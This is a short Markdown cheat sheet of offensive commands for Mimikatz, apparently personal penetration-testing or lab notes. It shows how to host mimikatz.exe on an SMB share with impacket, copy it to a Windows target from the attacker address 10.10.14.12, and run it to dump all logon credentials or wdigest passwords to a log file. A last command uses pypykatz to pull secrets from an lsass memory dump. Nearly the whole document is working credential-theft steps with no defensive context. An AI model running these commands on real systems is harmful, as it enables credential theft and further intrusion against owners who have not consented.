# Mimikatz

## Mimikatz

Locate
```
$ locate mimikatz.exe
/usr/share/windows-resources/mimikatz/Win32/mimikatz.exe
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

Host mimikatz
```
cd /usr/share/windows-resources/mimikatz/
impacket-smbserver share $(pwd) -smb2support
```


Copy to Target - x64
```
xcopy \\10.10.14.12\share\x64\mimikatz.exe C:\Temp\mimikatz\
```

Copy to Target - x86
```
xcopy \\10.10.14.12\share\Win32\mimikatz.exe C:\Temp\mimikatz\
```


All available creds
```
cd C:\Temp\mimikatz\
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::logonpasswords" exit
```

Only `wdigest`
```
cd C:\Temp\mimikatz\
C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::wdigest" exit
```





## Pypykatz

Get secrets from memory dump
```
pypykatz lsa minidump --grep lsass.DMP
```